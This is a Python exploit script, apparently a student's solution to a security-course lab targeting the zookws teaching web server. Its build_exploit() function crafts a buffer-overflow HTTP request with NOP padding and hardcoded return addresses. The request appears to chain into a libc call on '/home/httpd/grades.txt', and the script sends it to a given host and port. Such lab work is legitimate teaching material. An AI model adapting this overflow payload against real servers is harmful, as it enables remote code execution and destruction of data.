#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de
stack_saved_ebp = 0xdeadc0de
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    ret =  0xbfffe9fc
    ret_addr = ret + 16
    ret_addr = struct.pack("<I", ret_addr)
#    req = "GET /"+"\x90"*40+urllib.quote(shellcode+"\x90"*(1024-len(shellcode)-16-40)+ret_addr)+" HTTP/1.0\r\n"+"\r\n"

    string = " /home/httpd/grades.txt"
    req =   "\x90"+ string+ "\x00"+"\x90"*0x000fff #put string at the value of server protocol in env buffer, followed by a \x00 char in http_request_line.
    req = req+struct.pack("<I",0xbffff618)+struct.pack("<I",0x40102450)+struct.pack("<I",0x08048f32)+struct.pack("<I",0xbfffcdc2)+\
 (req)+"\x90"*16+" HTTP/1.0\r\n" + \
"\r\n" 
              

    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

